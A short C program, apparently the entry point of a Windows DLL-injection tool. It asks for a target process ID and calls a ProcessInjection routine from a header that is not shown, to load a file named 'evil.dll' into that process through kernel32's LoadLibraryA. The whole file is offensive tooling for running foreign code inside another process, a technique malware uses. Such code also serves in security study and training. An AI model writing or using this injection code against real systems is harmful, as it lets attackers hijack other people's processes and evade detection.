#include "process_injection.h"

int main() {
    const char* dllPath = ".\\evil.dll";
    printf("Enter the PID of the target process: ");
    DWORD PID;
    scanf("%d", &PID);
    printf("Attempting to inject DLL into process with PID: %d\n", PID);
    ProcessInjection( PID, strlen(dllPath) + 1, dllPath, "kernel32.dll", "LoadLibraryA");
    
    return 0;
}